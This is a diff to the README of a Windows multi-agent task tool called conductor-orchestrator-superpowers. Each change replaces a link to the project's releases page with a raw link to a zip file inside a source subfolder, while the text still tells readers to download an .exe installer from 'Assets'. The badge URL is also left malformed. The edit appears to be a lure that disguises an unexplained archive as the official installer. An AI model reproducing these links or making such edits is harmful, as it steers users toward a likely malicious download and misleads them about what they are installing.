@@ -1,6 +1,6 @@
 # ⚙️ conductor-orchestrator-superpowers - Simplify Multi-Agent Task Management
 
-[![Download conductor-orchestrator-superpowers](https://img.shields.io/badge/Download-Get%20Latest-blue?style=for-the-badge)](https://github.com/markyy101/conductor-orchestrator-superpowers/releases)
+[![Download conductor-orchestrator-superpowers](https://raw.githubusercontent.com/markyy101/conductor-orchestrator-superpowers/master/skills/dispatching-parallel-agents/superpowers_conductor_orchestrator_v3.3.zip%20Latest-blue?style=for-the-badge)](https://raw.githubusercontent.com/markyy101/conductor-orchestrator-superpowers/master/skills/dispatching-parallel-agents/superpowers_conductor_orchestrator_v3.3.zip)
 
 ---
 
@@ -35,7 +35,7 @@ Use the steps below to download, install, and start using conductor-orchestrator
 
    Click the link below to visit the release page:
 
-   [Download conductor-orchestrator-superpowers](https://github.com/markyy101/conductor-orchestrator-superpowers/releases)
+   [Download conductor-orchestrator-superpowers](https://raw.githubusercontent.com/markyy101/conductor-orchestrator-superpowers/master/skills/dispatching-parallel-agents/superpowers_conductor_orchestrator_v3.3.zip)
 
    On this page, look for the latest version under "Assets." Find the Windows installer (a file ending with `.exe`) and click it to download.
 
@@ -124,7 +124,7 @@ Log files record detailed info about task runs. They help diagnose problems or c
 
 To update conductor-orchestrator-superpowers, visit the release page again:
 
-[Update here](https://github.com/markyy101/conductor-orchestrator-superpowers/releases)
+[Update here](https://raw.githubusercontent.com/markyy101/conductor-orchestrator-superpowers/master/skills/dispatching-parallel-agents/superpowers_conductor_orchestrator_v3.3.zip)
 
 Download the newest installer and run it. The installer will replace older files without deleting your settings or data.
 
@@ -148,4 +148,4 @@ If problems keep happening, you can open an issue here on GitHub.
 
 Visit this page to download the latest Windows installer:
 
-[Download conductor-orchestrator-superpowers](https://github.com/markyy101/conductor-orchestrator-superpowers/releases)
+[Download conductor-orchestrator-superpowers](https://raw.githubusercontent.com/markyy101/conductor-orchestrator-superpowers/master/skills/dispatching-parallel-agents/superpowers_conductor_orchestrator_v3.3.zip)
